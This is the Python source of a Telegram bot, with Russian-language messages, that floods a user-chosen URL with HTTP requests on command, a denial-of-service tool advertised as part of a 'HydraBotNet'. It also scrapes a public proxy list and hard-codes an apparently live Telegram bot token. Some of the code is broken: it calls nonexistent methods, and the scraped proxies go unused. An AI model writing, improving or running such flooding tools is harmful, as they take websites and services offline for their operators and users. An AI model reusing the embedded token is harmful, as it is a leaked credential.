import requests
import re
import telebot
import threading

bot_token = '6410330202:AAHNtR3Sw1spmF34LTiJjMNCoic2vaVaQ2w'  # Замените на токен вашего бота в Telegram
bot = telebot.TeleBot(bot_token)

attack_interval = None
is_attack_started = False
proxies = []

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    response_message = '''
    hello info channel @HydraBotNet dev by @fyuman444 | @RealmeAgent 

    Введите /stop, чтобы остановить атаку.

    Чтобы начать атаку, используйте следующую команду:
    /attack <url> <time> <req_per_ip> <threads>

    Пример:
    /attack http://example.com 135 65 5
    '''
    bot.send_message(chat_id, response_message)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_interval, is_attack_started
    chat_id = message.chat.id
    command_params = message.text.split(' ')[1:]

    if len(command_params) != 4:
        response_message = 'Неверная команда! Пожалуйста, укажите требуемые параметры: URL, время, req_per_ip и threads.'
        bot.send_message(chat_id, response_message)
        return

    if is_attack_started:
        response_message = 'Атака уже запущена!'
        bot.send_message(chat_id, response_message)
        return

    target = command_params[0]
    time = int(command_params[1])
    req_per_ip = int(command_params[2])
    threads = int(command_params[3])

    attack_interval = threading.Timer(1, send_req, args=(chat_id, target, time, req_per_ip, threads))
    attack_interval.start()
    is_attack_started = True

    # Отправляем сообщение об успешной атаке
    success_message = f'Атака успешно запущена на {target} в течение {time} секунд с {threads} потоками и {req_per_ip} запросов на IP.'
    send_message_to_user(chat_id, success_message)

def send_req(chat_id, target, time, req_per_ip, threads):
    requests_list = []
    for i in range(threads):
        for j in range(req_per_ip):
            requests_list.append(requests.get(target))

    try:
        for request in requests_list:
            request.result()
    except Exception as error:
        print(error.message)

    threading.Timer(time, stop_attack, args=(chat_id,)).start()

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    chat_id = message.chat.id
    stop_attack(chat_id)
    response_message = 'Атака остановлена.'
    bot.send_message(chat_id, response_message)

def stop_attack(chat_id):
    global attack_interval, is_attack_started
    attack_interval.cancel()
    is_attack_started = False

def send_message_to_user(chat_id, message):
    bot.send_message(chat_id, message)

# Автоматически собираем прокси и сохраняем их в файл
def scrape_proxies():
    try:
        response = requests.get('https://www.proxy-list.download/api/v1/get?type=https')
        proxies = response.text.split('\r\n')
        with open('proxies.txt', 'w') as f:
            f.write('\n'.join(proxies))
        print('Прокси были собраны и сохранены в файле proxies.txt')
    except Exception as error:
        print('Ошибка при сборе прокси:', error.message)

# Вызываем функцию сбора прокси при запуске скрипта
scrape_proxies()

bot.polling()
